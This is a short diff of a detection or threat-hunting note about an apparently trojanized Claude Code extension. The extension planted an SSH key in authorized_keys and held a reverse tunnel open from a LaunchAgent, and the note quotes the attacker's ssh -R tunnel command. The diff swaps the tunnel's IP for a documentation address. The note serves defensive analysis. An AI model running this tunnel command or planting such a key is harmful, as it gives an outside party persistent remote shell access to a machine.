@@ -2,7 +2,7 @@
 
 The trojanized Cursor-marketplace Claude Code extension (anthropic.claude-code@2.1.313,
 2026-10-29) appended an `svc-telemetry` key to ~/.ssh/authorized_keys and held a reverse
-tunnel `ssh -N -R '*:0:localhost:22' tunnel@134.209.82.225` open from a LaunchAgent. Its
+tunnel `ssh -N -R '*:0:localhost:22' tunnel@198.51.100.88` open from a LaunchAgent. Its
 persistence already shows in rare_persistence; neither of these two did anywhere.
 
 Both are rare enough to judge per device against its own 14 days, with no fleet list:
